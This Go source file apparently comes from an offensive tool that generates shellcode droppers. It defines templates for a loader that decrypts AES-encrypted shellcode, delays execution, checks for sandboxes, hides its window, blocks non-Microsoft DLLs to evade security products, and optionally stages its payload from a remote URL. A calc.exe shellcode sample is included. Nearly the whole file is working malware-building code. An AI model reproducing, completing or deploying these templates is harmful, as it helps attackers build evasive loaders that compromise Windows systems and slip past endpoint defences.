package gengo

// Contains all the elements necessary for a dropper template
type Dropper struct {

	// Main Components
	FuncName string //Functioname
	FileName string //Filename (useful for output)
	KeyStr   string //EncryptionKey
	BufStr   string //Base64Shellcodestr
	Debug    bool   //determines if dropper files will be kept after write.

	//Template Specific
	Dtype  string
	Shared bool
	Dlls   string
	Inject string
	Import string
	Extra  string
	Arch   bool
	MemCom string

	//AntiSandbox/Evasion
	BoxChkFunc string
	BoxChkImp  string
	Delay      int
	ChkBox     string
	Domain     string
	BlockNonMs string
	LeetImp    string
	Hide       string //Hide window
	Garble     bool

	//Stager
	Stager       string
	StegImport   string
	StagerImport string
	Url          string
	HostHdr      string
	Ua           string

	//Dll Pieces
	Init       string //Trigger on init
	Export     string
	ProcAttach string
	C          string
	Hold       string
}

var CalcCode = []byte{
	//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
	0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
	0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
	0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
	0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
	0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
	0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
	0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
	0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
	0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
	0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
	0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
	0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
	0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
	0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
	0xd7,
}

type DtypeChild struct {
	//Child Dropper
	ChildProc string //Child Process
	Args      string //Args to pass to shellcode exec

}

type DtypeRemote struct {
	//Remote Dropper
	RemoteProc string //Program Proc to Execute in
	Pid        string
	Args       string
}

const GoDropperMain = `package main

{{.C}}

import (
	"time"
	"os"
	"crypto/cipher"
	"crypto/aes"
	"encoding/base64"
	{{.Import}}
	{{.BoxChkImp}}
	{{.LeetImp}}
	{{.StagerImport}}
	{{.StegImport}}
)

func pkcs5Trimming(encrypt []byte) []byte {
	padding := encrypt[len(encrypt)-1]
	return encrypt[:len(encrypt)-int(padding)]
}

func aesDecrypt(key string, buf string) ([]byte, error) {

	encKey, err := base64.StdEncoding.DecodeString(key)
	if err != nil {
		return nil, err
	}

	encBuf, err := base64.StdEncoding.DecodeString(buf)
	if err != nil {
		return nil, err
	}

	var block cipher.Block

	block, err = aes.NewCipher(encKey)
	if err != nil {
		return nil, err
	}

	if len(encBuf) < aes.BlockSize {

		os.Exit(69420)
	}
	iv := encBuf[:aes.BlockSize]
	encBuf = encBuf[aes.BlockSize:]

	cbc := cipher.NewCBCDecrypter(block, iv)
	cbc.CryptBlocks(encBuf, encBuf)
	decBuf := pkcs5Trimming(encBuf)

	return decBuf, nil

}

{{.MemCom}}

var hope = "{{.Domain}}"

{{.Extra}}

{{.BoxChkFunc}}

{{.ProcAttach}}

func init() {
	{{.BlockNonMs}}
	{{.ChkBox}}	
	{{.Init}}
}
func main() {

	{{.FuncName}}()

}

func loadImage() string {
	var img string
	{{.Url}}
	{{.HostHdr}}
	{{.Ua}}
	{{.Stager}}

	return img
}

//{{.Export}} {{.FuncName}}
func {{.FuncName}}() {

	{{.Dtype}}
	bufstring := {{.BufStr}}
	kstring := {{.KeyStr}}
	time.Sleep({{.Delay}}* time.Second)

	shellcode, err := aesDecrypt(kstring, bufstring)
	if err != nil {
		time.Sleep({{.Delay}}* time.Second)
		os.Exit(0)
	}
	{{.Dlls}}
	{{.Hide}}
	{{.Inject}}
	{{.Hold}}


}

`

const dtypeStager = `
	program := "{{.RemoteProc}}"
	args := "{{.Args}}"
	pid, err := strconv.Atoi("{{.Pid}}")
	if err != nil {
		pid = 0
	}

`
const dtypeRemote = `

	pid, err := strconv.Atoi("{{.Pid}}")
	if err != nil {
		pid = 0
	}
	`
const dtypeChild = `
	program := "{{.ChildProc}}"
	args := "{{.Args}}"
`

const hideWindow = `
	user32 := windows.NewLazyDLL("user32.dll")
	fgwindow := user32.NewProc("GetForegroundWindow")
	hwnd, _, _ := fgwindow.Call()
	showWindow := user32.NewProc("ShowWindow")
	showWindow.Call(hwnd, uintptr(uint32(0)))
`
const BlockNonMs = `
	procThreadAttributeSize := uintptr(0)
	_ = syscalls.InitializeProcThreadAttributeList(nil, 2, 0, &procThreadAttributeSize)
	procHeap, _ := syscalls.GetProcessHeap()
	attributeList, _ := syscalls.HeapAlloc(procHeap, 0, procThreadAttributeSize)
	defer syscalls.HeapFree(procHeap, 0, attributeList)
	var startupInfo syscalls.StartupInfoEx
	startupInfo.AttributeList = (*syscalls.PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))
	_ = syscalls.InitializeProcThreadAttributeList(startupInfo.AttributeList, 2, 0, &procThreadAttributeSize)
	mitigate := 0x20007 //"PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY"

	nonms := uintptr(0x100000000000)     //"PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON"

	_ = syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, uintptr(mitigate), &nonms, unsafe.Sizeof(nonms), 0, nil)
`
const LeetImports = `
	syscalls "github.com/sh4hin/GoPurple/sliverpkg"
`
const MemCom = `
const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)
`
